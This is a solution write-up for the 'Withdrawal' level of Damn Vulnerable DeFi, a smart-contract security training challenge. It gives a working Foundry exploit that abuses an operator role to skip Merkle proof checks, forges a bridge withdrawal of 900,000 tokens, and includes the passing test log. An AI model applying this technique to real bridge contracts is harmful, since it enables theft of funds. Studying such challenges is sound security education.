# Damn Vulnerable Defi - Withdrawal
- Scope
    - TokenBridge.sol  
    - L1Forwarder.sol  
    - L1Gateway.sol  
    - L2Handler.sol  
    - L2MessageStore.sol  
    - withdrawals.json
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

### Impact/Proof of Concept
From one of the transaction in withdrawals.json, the data is broken down into the following format. Hence, with this, we can determine that the 3rd transaction is malicious as it is trying to withdraw 999000 tokens and we need to prevent that from happening.
```
eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id
0000000000000000000000000000000000000000000000000000000066729b63 // timestamp
0000000000000000000000000000000000000000000000000000000000000060 // data.offset
0000000000000000000000000000000000000000000000000000000000000104 // data.length
01210a38                                                         // L1Forwarder.forwardMessage.selector
0000000000000000000000000000000000000000000000000000000000000000 // L2Handler.nonce
000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // l2Sender
0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target (l1TokenBridge)
0000000000000000000000000000000000000000000000000000000000000080 // message.offset
0000000000000000000000000000000000000000000000000000000000000044 // message.length
81191e51                                                         // TokenBridge.executeTokenWithdrawal.selector
000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver
0000000000000000000000000000000000000000000000008ac7230489e80000 // amount (10e18)
0000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000
```

1. Player has `OPERATOR_ROLE`, allowing bypass of Merkle tree check in L1Gateway's `finalizedWithdrawal()`
2. We perform a withdrawal from TokenBridge before the 4 transactions
3. Fast forward 7 days to finalize the 4 transactions as required to pass the challenge, the 3rd malicious transaction will not pass as there is insufficient fund
4. Return the tokens back to TokenBridge

```diff
function test_withdrawal() public checkSolvedByPlayer {

        // fake withdrawal operation and obtain tokens
        bytes memory message = abi.encodeCall(
            L1Forwarder.forwardMessage,
            (
                0, // nonce
                address(0), //  
                address(l1TokenBridge), // target
                abi.encodeCall( // message
                    TokenBridge.executeTokenWithdrawal,
                    (
                        player, // deployer receiver
                        900_000e18 //rescue 900_000e18
                    )
                )
            )
        );

        l1Gateway.finalizeWithdrawal(
            0, // nonce
            l2Handler, // pretend l2Handler 
            address(l1Forwarder), // target is l1Forwarder
            block.timestamp - 7 days, // to pass 7 days waiting peroid
            message, 
            new bytes32[](0)   
        );

        // Perform finalizedWithdrawals due to we are operator, don't need to provide merkleproof.
        
        vm.warp(1718786915 + 8 days);
        // first finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            0, // nonce 0
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786915, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // second finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            1, // nonce 1
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786965, // timestamp
            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // third finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            2, // nonce 2
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787050, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // fourth finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            3, // nonce 3
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787127, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );
 
        token.transfer(address(l1TokenBridge),900_000e18);
        console.log("token.balanceOf(address(l1TokenBridge)",token.balanceOf(address(l1TokenBridge)));
    }
```

Results
```diff
[PASS] test_withdrawal() (gas: 473812)
Logs:
  token.balanceOf(address(l1TokenBridge) 999970000000000000000000
```

